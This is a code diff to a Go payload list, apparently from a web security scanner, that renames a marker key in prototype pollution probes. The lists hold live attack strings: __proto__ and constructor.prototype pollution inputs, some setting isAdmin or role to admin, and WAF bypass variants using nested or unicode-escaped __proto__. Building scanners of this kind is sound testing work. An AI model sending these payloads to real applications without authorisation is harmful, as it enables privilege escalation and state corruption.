@@ -55,7 +55,7 @@ func GetWAFBypassPayloads() []Payload {
 // Query parameter payloads (__proto__[key]=value style).
 // Source: PayloadsAllTheThings, HackTricks
 var queryParamPayloads = []Payload{
-	{Value: "__proto__[skws]=1", Technique: TechQueryParam, Description: "Prototype pollution via __proto__ bracket notation"},
+	{Value: "__proto__[assay]=1", Technique: TechQueryParam, Description: "Prototype pollution via __proto__ bracket notation"},
 	{Value: "__proto__[constructor]=1", Technique: TechQueryParam, Description: "Prototype pollution targeting constructor property"},
 	{Value: "__proto__[toString]=1", Technique: TechQueryParam, Description: "Prototype pollution overriding toString"},
 	{Value: "__proto__[hasOwnProperty]=1", Technique: TechQueryParam, Description: "Prototype pollution overriding hasOwnProperty"},
@@ -66,9 +66,9 @@ var queryParamPayloads = []Payload{
 // JSON body payloads ({"__proto__": {"key": "value"}} style).
 // Source: PayloadsAllTheThings, HackTricks
 var jsonBodyPayloads = []Payload{
-	{Value: `{"__proto__":{"skws":"1"}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via __proto__"},
-	{Value: `{"constructor":{"prototype":{"skws":"1"}}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via constructor.prototype"},
-	{Value: "constructor.prototype.skws=1", Technique: TechJSONBody, Description: "Constructor prototype pollution via dot path"},
+	{Value: `{"__proto__":{"assay":"1"}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via __proto__"},
+	{Value: `{"constructor":{"prototype":{"assay":"1"}}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via constructor.prototype"},
+	{Value: "constructor.prototype.assay=1", Technique: TechJSONBody, Description: "Constructor prototype pollution via dot path"},
 	{Value: `{"__proto__":{"isAdmin":true}}`, Technique: TechJSONBody, Description: "JSON prototype pollution setting admin flag"},
 	{Value: `{"__proto__":{"role":"admin"}}`, Technique: TechJSONBody, Description: "JSON prototype pollution setting role"},
 	{Value: `{"__proto__":{"toString":"polluted"}}`, Technique: TechJSONBody, Description: "JSON prototype pollution overriding toString"},
@@ -77,7 +77,7 @@ var jsonBodyPayloads = []Payload{
 // Dot notation payloads (__proto__.key=value style).
 // Source: PayloadsAllTheThings, HackTricks
 var dotNotationPayloads = []Payload{
-	{Value: "__proto__.skws=1", Technique: TechDotNotation, Description: "Dot notation prototype pollution"},
+	{Value: "__proto__.assay=1", Technique: TechDotNotation, Description: "Dot notation prototype pollution"},
 	{Value: "__proto__.constructor.name=1", Technique: TechDotNotation, Description: "Dot notation targeting constructor.name"},
 	{Value: "__proto__.isAdmin=true", Technique: TechDotNotation, Description: "Dot notation setting admin flag"},
 	{Value: "__proto__.role=admin", Technique: TechDotNotation, Description: "Dot notation setting role to admin"},
@@ -87,7 +87,7 @@ var dotNotationPayloads = []Payload{
 // WAF bypass payloads that use encoding or alternative syntax.
 // Source: PayloadsAllTheThings
 var wafBypassPayloads = []Payload{
-	{Value: `{"__pro__proto__to__":{"skws":"1"}}`, Technique: TechJSONBody, Description: "Nested __proto__ bypass", WAFBypass: true},
-	{Value: `{"\\u005f\\u005fproto\\u005f\\u005f":{"skws":"1"}}`, Technique: TechJSONBody, Description: "Unicode escaped __proto__", WAFBypass: true},
-	{Value: "constructor[prototype][skws]=1", Technique: TechQueryParam, Description: "Constructor prototype bracket bypass", WAFBypass: true},
+	{Value: `{"__pro__proto__to__":{"assay":"1"}}`, Technique: TechJSONBody, Description: "Nested __proto__ bypass", WAFBypass: true},
+	{Value: `{"\\u005f\\u005fproto\\u005f\\u005f":{"assay":"1"}}`, Technique: TechJSONBody, Description: "Unicode escaped __proto__", WAFBypass: true},
+	{Value: "constructor[prototype][assay]=1", Technique: TechQueryParam, Description: "Constructor prototype bracket bypass", WAFBypass: true},
 }
